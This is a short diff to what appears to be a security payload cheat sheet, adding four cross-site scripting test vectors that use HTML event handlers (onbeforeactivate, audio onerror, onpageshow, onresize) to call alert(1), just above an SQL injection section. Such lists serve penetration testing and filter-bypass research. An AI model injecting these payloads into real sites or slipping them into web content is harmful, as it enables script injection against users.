@@ -31,6 +31,13 @@ Injects malicious code to a web page
 
 `<body onafterprint=alert(1)>`
 
+`<a id=x tabindex=1 onbeforeactivate=alert(1)></a>`
+
+`<audio src/onerror=alert(1)>`
+
+`<body onpageshow=alert(1)>`
+
+`<body onresize=alert(1)`
 
 
 ### SQL Injection
